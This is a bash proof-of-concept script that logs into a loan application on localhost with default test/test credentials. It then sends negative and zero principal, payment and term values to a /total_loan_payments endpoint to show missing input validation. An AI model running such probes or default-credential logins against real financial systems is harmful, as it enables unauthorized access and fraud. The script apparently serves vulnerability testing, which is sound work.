#!/bin/bash

# POC: Business Logic Flaws - Negative and Zero Values in Loan Calculation
# Target: /total_loan_payments endpoint
# Vulnerability: Accepts negative and zero values without validation
# Impact: Invalid financial calculations, potential fraud

TARGET="http://localhost:8080"
COOKIE_FILE="/tmp/cookies.txt"

echo "=== Business Logic Flaw POC: Invalid Loan Calculation Values ==="
echo ""

# First, authenticate with default credentials
echo "[*] Step 1: Authenticating with default credentials (test/test)..."
curl -s -c "$COOKIE_FILE" -X POST "$TARGET/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=test&password=test" > /dev/null

if [ $? -ne 0 ]; then
    echo "[-] Authentication failed"
    exit 1
fi
echo "[+] Authentication successful"
echo ""

# Test 1: Negative Payment Value
echo "[*] Test 1: Negative Payment Value"
echo "Request: GET /total_loan_payments?principal=1000&payment=-100&term=12"
RESPONSE=$(curl -s -b "$COOKIE_FILE" "$TARGET/total_loan_payments?principal=1000&payment=-100&term=12")
echo "Response: $RESPONSE"
if echo "$RESPONSE" | grep -q '"-1200' || echo "$RESPONSE" | grep -q '\-1200'; then
    echo "[+] VULNERABLE: Negative total_loan_payments calculated (-1200.0)"
else
    echo "[-] Response does not show negative value"
fi
echo ""

# Test 2: Zero Payment Value
echo "[*] Test 2: Zero Payment Value"
echo "Request: GET /total_loan_payments?principal=1000&payment=0&term=12"
RESPONSE=$(curl -s -b "$COOKIE_FILE" "$TARGET/total_loan_payments?principal=1000&payment=0&term=12")
echo "Response: $RESPONSE"
if echo "$RESPONSE" | grep -q '"0.0"' || echo "$RESPONSE" | grep -q '0.0'; then
    echo "[+] VULNERABLE: Zero total_loan_payments accepted (bypasses calculation)"
else
    echo "[-] Response does not show zero value"
fi
echo ""

# Test 3: Zero Term Value
echo "[*] Test 3: Zero Term Value"
echo "Request: GET /total_loan_payments?principal=1000&payment=100&term=0"
RESPONSE=$(curl -s -b "$COOKIE_FILE" "$TARGET/total_loan_payments?principal=1000&payment=100&term=0")
echo "Response: $RESPONSE"
if echo "$RESPONSE" | grep -q '"0.0"' || echo "$RESPONSE" | grep -q '0.0'; then
    echo "[+] VULNERABLE: Zero term accepted (bypasses time-based calculation)"
else
    echo "[-] Response does not show zero value"
fi
echo ""

# Test 4: Negative Principal Value
echo "[*] Test 4: Negative Principal Value"
echo "Request: GET /total_loan_payments?principal=-1000&payment=100&term=12"
RESPONSE=$(curl -s -b "$COOKIE_FILE" "$TARGET/total_loan_payments?principal=-1000&payment=100&term=12")
echo "Response: $RESPONSE"
if echo "$RESPONSE" | grep -q '"-1000' || echo "$RESPONSE" | grep -q '\-1000'; then
    echo "[+] VULNERABLE: Negative principal value accepted"
else
    echo "[-] Response does not show negative principal"
fi
echo ""

# Test 5: Combining multiple invalid values
echo "[*] Test 5: Multiple Invalid Values (negative principal, negative payment, zero term)"
echo "Request: GET /total_loan_payments?principal=-5000&payment=-250&term=0"
RESPONSE=$(curl -s -b "$COOKIE_FILE" "$TARGET/total_loan_payments?principal=-5000&payment=-250&term=0")
echo "Response: $RESPONSE"
if echo "$RESPONSE" | grep -q '"-5000\|"-250\|"0.0'; then
    echo "[+] VULNERABLE: Multiple invalid parameters accepted without validation"
else
    echo "[-] Response may have validation"
fi
echo ""

echo "[*] POC Complete: Business logic flaws confirmed in /total_loan_payments endpoint"
echo "[*] The endpoint accepts invalid financial values that violate real-world loan constraints"